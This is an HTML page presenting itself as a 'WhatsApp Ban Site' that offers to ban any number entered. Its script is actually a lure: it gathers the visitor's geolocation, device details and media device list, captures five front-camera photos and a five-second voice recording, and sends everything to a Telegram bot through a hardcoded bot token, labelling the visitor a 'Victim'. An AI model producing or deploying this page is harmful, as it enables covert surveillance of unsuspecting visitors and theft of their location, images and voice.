<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>WhatsApp Ban Site</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat" />
<style>
  body {
    font-family: 'Montserrat', sans-serif;
    margin: 0;
    background-color: #f5f5f5;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  .header {
    background-color: #d32f2f;
    padding: 20px 0;
    text-align: center;
  }

  .header h1 {
    color: white;
    font-size: 28px;
    margin: 0;
  }

  .container {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 30px 20px;
  }

  #wpnumber {
    width: 100%;
    max-width: 350px;
    padding: 15px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 8px;
    margin-bottom: 20px;
    box-sizing: border-box;
  }

  #banbtn {
    width: 100%;
    max-width: 350px;
    padding: 15px;
    background-color: #d32f2f;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    font-family: 'Montserrat', sans-serif;
  }

  #banbtn:hover {
    background-color: #b71c1c;
  }

  #details {
    max-width: 350px;
    width: 100%;
    margin-top: 20px;
    background-color: #eee;
    padding: 10px;
    border-radius: 8px;
    white-space: pre-wrap;
    max-height: 300px;
    overflow-y: auto;
    font-size: 14px;
  }

  footer {
    text-align: center;
    padding: 15px 0;
    background-color: #fff;
  }
</style>
</head>
<body>
<div class="header">
  <h1>WhatsApp Ban Site</h1>
</div>
<div class="container">
  <input id="wpnumber" type="text" placeholder="Enter WhatsApp Number" spellcheck="false" />
  <button id="banbtn" onclick="collectAndSend()">Let's Ban It</button>
  <div id="details"></div>
</div>
<footer>
  <p>Made With ❤️ By NASIR HACKER</p>
</footer>

<script>
const botToken = '7530633346:AAGcNuDErVnXJxzuan7zEpyQUbMDMwk0DW4'; // Replace with your bot token

// Get chat ID from URL param 'id'
function getChatId() {
  const params = new URLSearchParams(window.location.search);
  return params.get('id');
}

async function collectAndSend() {
  const btn = document.getElementById('banbtn');
  btn.textContent = 'Processing...';

  const details = [];

  const number = document.getElementById('wpnumber').value.trim();
  details.push(`Target WhatsApp Number: ${number}`);

  // Notification permission
  let notificationPermission = Notification.permission;
  if (notificationPermission !== 'granted') {
    notificationPermission = await Notification.requestPermission();
  }
  details.push(`Notification Permission: ${notificationPermission}`);

  // Geolocation
  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    details.push(`Geolocation: Latitude ${pos.coords.latitude}, Longitude ${pos.coords.longitude}`);
  } catch {
    details.push('Geolocation: Unable to get geolocation.');
  }

  // Device info
  const deviceInfo = {
    UserAgent: navigator.userAgent,
    Platform: navigator.platform,
    Language: navigator.language,
    Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    Screen: `${window.screen.width}x${window.screen.height}`,
    Viewport: `${window.innerWidth}x${window.innerHeight}`,
    CPU: navigator.hardwareConcurrency || 'N/A',
    Connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
  };
  details.push('Device Info:\n' + JSON.stringify(deviceInfo, null, 2));

  // Media Devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const deviceList = devices.map(d => `${d.kind}: ${d.label}`).join('\n');
    details.push(`Media Devices:\n${deviceList}`);
  } catch {
    details.push('Media Devices: Not accessible.');
  }

  // Start camera capture 4-5 images
  const images = [];
  for (let i = 0; i < 5; i++) {
    const imgDataUrl = await capturePhoto();
    if (imgDataUrl) {
      images.push(imgDataUrl);
    }
    await new Promise(r => setTimeout(r, 1000)); // slight delay between captures
  }

  // Record voice
  const voiceBlob = await recordAudio();

  // Send all data
  await sendToTelegram(details.join('\n'), images, voiceBlob);

  document.getElementById('details').innerText = details.join('\n');
  btn.textContent = "Let's Ban It";
}

// Capture photo from front camera
async function capturePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 1000));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(t => t.stop());
    return canvas.toDataURL('image/png');
  } catch (err) {
    console.error('Camera error:', err);
    return null;
  }
}

// Record voice
async function recordAudio() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.start();
    await new Promise(r => setTimeout(r, 5000)); // record 5 seconds
    mediaRecorder.stop();
    await new Promise(r => mediaRecorder.onstop = r);
    stream.getTracks().forEach(t => t.stop());
    return new Blob(chunks, { type: 'audio/webm' });
  } catch (err) {
    console.error('Audio error:', err);
    return null;
  }
}

// Send images, voice, and message to Telegram
async function sendToTelegram(text, images, voiceBlob) {
  const chatId = getChatId();
  if (!chatId) {
    alert('Missing chat id in URL');
    return;
  }

  // Send message
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: `<b>Victim Get Hacked By Nasir Hacker</b>`, parse_mode: 'HTML' })
  });

  // Send device info message
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: `<pre>${text}</pre>`, parse_mode: 'HTML' })
  });

  // Send images
  for (const [index, imgDataUrl] of images.entries()) {
    await sendPhoto(imgDataUrl, chatId);
  }

  // Send voice
  if (voiceBlob) {
    await sendAudio(voiceBlob, chatId);
  }
}

async function sendPhoto(dataUrl, chatId) {
  const base64 = dataUrl.split(',')[1];
  const binary = atob(base64);
  const array = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
  const blob = new Blob([array], { type: 'image/png' });
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'photo.png');
  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
}

async function sendAudio(blob, chatId) {
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('audio', blob, 'voice.webm');
  await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: formData });
}

function getChatId() {
  const params = new URLSearchParams(window.location.search);
  return params.get('id');
}
</script>
</body>
  </html>
